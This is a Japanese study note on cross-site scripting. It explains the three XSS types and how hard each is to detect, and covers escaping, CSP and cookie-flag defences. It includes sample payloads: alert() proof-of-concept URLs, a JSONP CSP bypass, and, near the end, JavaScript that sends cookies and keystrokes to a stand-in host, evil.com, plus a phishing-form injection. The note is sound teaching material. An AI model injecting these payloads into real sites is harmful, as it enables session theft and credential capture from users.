---
topic: XSS Deep Dive
category: web-security
tags: [security, web, xss, owasp, deep-dive]
created: 2026-01-03
---

# XSS（Cross-Site Scripting）深掘り

3種類のXSSとその防御を攻撃者視点で理解する。

## 根本原因

**ユーザー入力がブラウザでコードとして実行される。**

SQLiがサーバー側（DB）を狙うのに対し、XSSはクライアント側（ブラウザ）を狙う。

## 3種類のXSS

### 1. Stored XSS（格納型）

```
攻撃者 → 掲示板に投稿 → DBに保存
                            ↓
被害者 → ページを閲覧 → スクリプト実行
```

**特徴:**
- 攻撃コードがサーバーに保存される
- 被害者がページを開くだけで発動
- 影響範囲が広い（閲覧者全員）

### 2. Reflected XSS（反射型）

```
攻撃者 → 悪意あるリンクを送る
被害者 → リンクをクリック
サーバー → 入力をそのまま画面に反映
被害者 → スクリプト実行
```

例：検索機能
```
正常: https://site.com/search?q=apple
攻撃: https://site.com/search?q=<script>alert('XSS')</script>
```

### 3. DOM-based XSS

```
サーバー → 正常なHTMLを返す（攻撃コードなし）
ブラウザ → JavaScriptがURLを読み取り、画面に反映
         → スクリプト実行
```

**サーバーを経由しない。**

例：
```javascript
// サイトのJavaScript
const hash = location.hash.substring(1);
document.getElementById('greeting').innerHTML = 'Hello, ' + hash;
```

```
攻撃: https://site.com/#<img src=x onerror=alert('XSS')>
```

## 難易度の質的な違い

### 自分の分析

> Stored と Reflected の難しさは「タイプが違う」。
>
> **Stored XSS:**
> - 格納が成功してある程度潜伏する必要がある
> - 防護者からのブロック、監視、検知を掻い潜り続けないとスケールしない
>
> **Reflected XSS:**
> - URLが不審なので、ユーザーの意識次第で気付ける
> - サーバーやブラウザの検知があり、成功確率そのものが極端に難しくなる

| 種類 | 難しさのタイプ |
|------|--------------|
| Stored | 持続性の確保（検知回避、潜伏、スケール） |
| Reflected | 単発の成功率（URL不審、ユーザー意識、ブラウザ検知） |

## DOM-based XSS の検知困難性

```
URL: https://site.com/#<script>alert('XSS')</script>
                       ↑
                 # 以降はサーバーに送られない
```

### 自分の理解

> ログには攻撃内容が含まれておらず、単なるリクエストに見える。サーバー側の監視が完全に無効。

| 種類 | 攻撃コードの場所 | サーバーでの検知 |
|------|----------------|-----------------|
| Stored | サーバーDB | 可能 |
| Reflected | リクエスト内 | 可能 |
| DOM-based | URLフラグメント/JS内 | 不可能 |

## 防御1: 出力エスケープ（根本対策）

コンテキストに応じたエスケープ:

| コンテキスト | エスケープ |
|-------------|-----------|
| HTML本文 | `<` → `&lt;` |
| HTML属性 | `"` → `&quot;` |
| JavaScript | `'` → `\'` |
| URL | `<` → `%3C` |

## 防御2: CSP（Content Security Policy）

```http
Content-Security-Policy: script-src 'self'
```

「このページでは、自分のドメインからのスクリプトしか実行しない」

### CSPバイパス

> CSPがあれば完全に防げるか？「ドメイン内部からは受け付けるので、その経路が使えるならば可能」

**バイパス例:**

1. **同一ドメイン内のユーザーコンテンツ**
   ```
   攻撃者がmalware.jsをアップロード
   → https://site.com/uploads/malware.js は 'self' に該当
   ```

2. **JSONPエンドポイント**
   ```
   https://site.com/api/data?callback=alert('XSS')//
   ```

3. **信頼されたCDNの悪用**
   ```
   CDN内の脆弱なライブラリを利用
   ```

**CSPは多層防御の一つ。エスケープが根本、CSPは保険。**

## 防御3: Cookie属性

XSSが成功しても被害を限定:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

| 属性 | 効果 | 防ぐ攻撃 |
|------|------|----------|
| HttpOnly | JSからアクセス不可 | XSSでのCookie窃取 |
| Secure | HTTPSでのみ送信 | 盗聴 |
| SameSite | 他サイトからのリクエストに付与しない | CSRF |

**3つ全部つけて初めて堅牢。**

## 実際の攻撃コード

`alert('XSS')` は概念実証。実際には:

```javascript
// セッション窃取
new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;

// キーロガー
document.onkeypress = function(e) {
  new Image().src = 'https://evil.com/log?key=' + e.key;
};

// フィッシング
document.body.innerHTML = '<form action="https://evil.com/phish">...'
```

## まとめ

| 項目 | 内容 |
|------|------|
| 3種類 | Stored（格納）、Reflected（反射）、DOM-based |
| 難易度 | 持続性 vs 成功率（質が違う） |
| DOM-based | サーバーログに残らない |
| 防御 | エスケープ（根本）+ CSP（多層）+ Cookie属性（被害限定） |

## 関連

- [[sqli-deep-dive]] - SQLインジェクション深掘り
- [[owasp-top-10]] - 全体像
- [[csrf]] - 関連する攻撃
